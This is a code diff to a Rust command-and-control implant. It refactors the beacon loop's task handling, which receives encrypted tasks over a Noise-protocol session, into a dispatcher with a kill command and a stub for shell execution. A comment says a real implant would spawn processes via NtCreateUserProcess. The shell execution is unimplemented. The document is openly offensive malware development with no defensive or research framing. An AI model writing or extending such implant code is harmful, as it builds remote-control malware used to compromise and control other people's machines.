@@ -1,6 +1,5 @@
 use crate::utils::syscalls::*;
 use alloc::format;
-use alloc::string::{String, ToString};
 use alloc::vec::Vec;
 use serde::{Deserialize, Serialize};
 use snow::Builder;
@@ -347,11 +346,7 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
             let mut pt = [0u8; 4096];
             if let Ok(len) = session.read_message(&resp, &mut pt) {
                 let tasks_json = &pt[..len];
-                if is_kill_command(tasks_json) {
-                    unsafe {
-                        crate::utils::syscalls::sys_exit(0);
-                    }
-                }
+                dispatch_tasks(tasks_json);
             }
         }
 
@@ -359,12 +354,25 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
     }
 }
 
-fn is_kill_command(data: &[u8]) -> bool {
-    // Naive search for "kill" command
-    for i in 0..data.len().saturating_sub(4) {
-        if data[i] == b'k' && data[i + 1] == b'i' && data[i + 2] == b'l' && data[i + 3] == b'l' {
-            return true;
+fn dispatch_tasks(data: &[u8]) {
+    if is_kill_command(data) {
+        unsafe {
+            crate::utils::syscalls::sys_exit(0);
         }
     }
-    false
+
+    // Shell execution stub
+    // In a real implant, we would parse the JSON properly and execute NtCreateUserProcess or similar.
+    if contains(data, b"\"shell\"") {
+        // execute shell...
+    }
+}
+
+fn contains(haystack: &[u8], needle: &[u8]) -> bool {
+    haystack.windows(needle.len()).any(|w| w == needle)
+}
+
+fn is_kill_command(data: &[u8]) -> bool {
+    // Naive search for "kill" command
+    contains(data, b"kill")
 }
